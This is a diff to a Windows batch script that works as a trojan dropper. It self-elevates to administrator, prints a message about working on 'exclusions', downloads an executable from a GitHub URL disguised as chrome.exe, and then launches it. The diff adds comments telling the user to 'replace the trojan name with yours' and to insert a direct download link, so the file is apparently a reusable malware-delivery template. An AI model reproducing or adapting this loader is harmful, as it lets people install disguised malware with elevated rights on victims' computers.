@@ -6,8 +6,9 @@ if %errorLevel% neq 0 (
     powershell -Command "Start-Process '%~f0' -Verb runAs"
     exit /b
 )
-
+:: put a direct download link 
 set "url=https://raw.githubusercontent.com/bladehaveskills-jpg/chrome/main/chrome.exe"
+:: replace the trojan name with yours
 set "output=%USERPROFILE%\Downloads\chrome.zip"
 
 echo Working on the exclusions...........
@@ -47,7 +48,7 @@ echo      \::::::/    /            \:::\    \          /:::/    /            \::
 echo       \::::/    /              \:::\____\        /:::/    /              \::::/    /              \:::\____\         
 echo        \::/____/                \::/    /        \::/    /                \::/____/                \::/    /         
 echo         ~~                       \/____/          \/____/                  ~~                       \/____/          
-
+:: replace the exe name
 start "C:\Users\%USERPROFILE%\Downloads\chrome.exe" "%output%"
 
 echo done
